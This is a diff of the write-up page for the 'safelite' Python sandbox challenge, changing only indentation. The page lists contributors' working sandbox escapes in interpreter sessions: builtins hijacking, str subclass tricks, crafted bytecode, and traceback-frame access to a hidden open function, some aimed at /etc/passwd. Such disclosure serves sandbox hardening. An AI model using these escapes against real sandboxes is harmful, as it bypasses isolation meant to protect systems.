@@ -16,7 +16,7 @@ The challenge is simple:
 
 * Open a fresh Python interpreter and do:
 
-    >>> from safelite import FileReader
+  >>> from safelite import FileReader
 
 * You can use ``FileReader`` to read files on your filesystem
 
@@ -55,55 +55,55 @@ Good luck and thanks! =)
   found the `first exploit
   <http://mail.python.org/pipermail/python-dev/2009-February/086406.html>`_: 
 
-    >>> reload(__builtins__)
-    <module '__builtin__' (built-in)> 
+  >>> reload(__builtins__)
+  <module '__builtin__' (built-in)> 
 
-    >>> open('0wn3d', 'w').write('w00t\n')
+  >>> open('0wn3d', 'w').write('w00t\n')
 
   [Fixed in v2]
 
 * `Guido van Rossum <http://python.org/~guido/>`_ and `Mark Eichin
   <http://twitter.com/eichin>`_ came up with this devious:
 
-    >>> class S(str):
-    ...     def __eq__(self, o): return 'r' == o
+  >>> class S(str):
+  ...     def __eq__(self, o): return 'r' == o
 
-    >>> f = FileReader('w00t', S('w'))
+  >>> f = FileReader('w00t', S('w'))
 
-    >>> f.close() # creates an empty file called 'w00t'
+  >>> f.close() # creates an empty file called 'w00t'
 
   [Fixed in v3]
 
 * `clsn <http://web.meson.org/>`_ took it further and bypassed the fix in v4:
 
-    >>> class S(str):
-    ...     def __eq__(self, o): return 'r' == o
-    ...     def __str__(self): return self
+  >>> class S(str):
+  ...     def __eq__(self, o): return 'r' == o
+  ...     def __str__(self): return self
 
   [Fixed in v5]
 
 * `Mike Rooney <http://mrooney.blogspot.com/>`_ started messing with the
   assumptions of builtins being unaltered:
 
-    >>> __builtins__.str = S
+  >>> __builtins__.str = S
 
   [Fixed in v5]
 
 * Farshid Lashkari then took it to a whole new `elegant level
   <http://mail.python.org/pipermail/python-dev/2009-February/086425.html>`_:
 
-    >>> _real_file = None
+  >>> _real_file = None
 
-    >>> def _new_isinstance(obj,types):
-    ...     global _real_file
-    ...     if _real_file is None and obj.__class__.__name__ == 'file':
-    ...         _real_file = obj.__class__
-    ...     return _old_isinstance(obj,types)
+  >>> def _new_isinstance(obj,types):
+  ...     global _real_file
+  ...     if _real_file is None and obj.__class__.__name__ == 'file':
+  ...         _real_file = obj.__class__
+  ...     return _old_isinstance(obj,types)
 
-    >>> __builtins__.isinstance = _new_isinstance
-    >>> FileReader('nul')
+  >>> __builtins__.isinstance = _new_isinstance
+  >>> FileReader('nul')
 
-    >>> f = _real_file('foo.txt', 'w')
+  >>> f = _real_file('foo.txt', 'w')
 
   [Fixed in v5]
 
@@ -111,14 +111,14 @@ Good luck and thanks! =)
   `__metaclass__ was accessible
   <http://mail.python.org/pipermail/python-dev/2009-February/086437.html>`_:
 
-    >>> f = FileReader('/etc/passwd')
-    >>> kall = f.__class__.__metaclass__.__call__.im_func
+  >>> f = FileReader('/etc/passwd')
+  >>> kall = f.__class__.__metaclass__.__call__.im_func
 
-    >>> kall(f.__class__.__metaclass__, [('foo', 47)])
-    <type 'list'>
+  >>> kall(f.__class__.__metaclass__, [('foo', 47)])
+  <type 'list'>
 
-    >>> f.__class__.__metaclass__.foo
-    47
+  >>> f.__class__.__metaclass__.foo
+  47
 
   [Locked-down in v6 before he could do any real damage ;p]
 
@@ -126,18 +126,18 @@ Good luck and thanks! =)
   with his `super hardcore exploit
   <http://thepaulprog.blogspot.com/2009/02/safelite-exploit.html>`_:
 
-    >>> __builtins__.TypeError = type(lambda: 0)(type(compile('1', 'b', 'eval'))(
-    ...   2, 2, 4, 67,
-    ...   'y\x08\x00t\x00\x00\x01Wn\x09\x00\x01\x01a\x00\x00n\x01\x00X|\x01\x00|\x00\x00\x83\x01\x00S',
-    ...   (None,), ('stuff',), ('g', 'x'), 'q', 'f', 1, ''), globals(), None, (TypeError,)
-    ... )
+  >>> __builtins__.TypeError = type(lambda: 0)(type(compile('1', 'b', 'eval'))(
+  ...   2, 2, 4, 67,
+  ...   'y\x08\x00t\x00\x00\x01Wn\x09\x00\x01\x01a\x00\x00n\x01\x00X|\x01\x00|\x00\x00\x83\x01\x00S',
+  ...   (None,), ('stuff',), ('g', 'x'), 'q', 'f', 1, ''), globals(), None, (TypeError,)
+  ... )
 
-    >>> try:
-    ...     FileReader('foo', 2)
-    ... except:
-    ...     pass
+  >>> try:
+  ...     FileReader('foo', 2)
+  ... except:
+  ...     pass
 
-    >>> stuff.tb_frame.f_back.f_locals['open_file']('w00t', 'w').write('yaymore\n')
+  >>> stuff.tb_frame.f_back.f_locals['open_file']('w00t', 'w').write('yaymore\n')
 
   [Fixed in v6 -- but the principles can still be used. Paul Cannon `explains
   in depth <http://thepaulprog.blogspot.com/2009/02/safelite-exploit.html>`_.]
@@ -182,15 +182,15 @@ Good luck and thanks! =)
 
 * Nick Coghlan got evil with context managers:
 
-    >>> class EvilCM(object):
-    ...     def __enter__(self):
-    ...         return self
-    ...     def __exit__(self, exc_type, exc, tb):
-    ...         tb.tb_next.tb_frame.f_locals['open_file']('w00t', 'w').write('yay!\n')
-    ...         return True
+  >>> class EvilCM(object):
+  ...     def __enter__(self):
+  ...         return self
+  ...     def __exit__(self, exc_type, exc, tb):
+  ...         tb.tb_next.tb_frame.f_locals['open_file']('w00t', 'w').write('yay!\n')
+  ...         return True
 
-    >>> with EvilCM():
-    ...     FileReader(10, 12)
+  >>> with EvilCM():
+  ...     FileReader(10, 12)
 
   [Fixed in v8]
 
@@ -198,11 +198,11 @@ Good luck and thanks! =)
   trusted code to evaluate unsafe code in its own globals!! [See also his
   similar hack with eval in the comments below].
 
-    >>> f = FileReader('/etc/passwd')
-    >>> f.__class__.__int__ = input
+  >>> f = FileReader('/etc/passwd')
+  >>> f.__class__.__int__ = input
 
-    >>> f.read(f)
-    (fileobj.__class__('/tmp/w00t', 'w').write('w00t\n'), 0)[1]
+  >>> f.read(f)
+  (fileobj.__class__('/tmp/w00t', 'w').write('w00t\n'), 0)[1]
 
   [Fixed in v9]
 
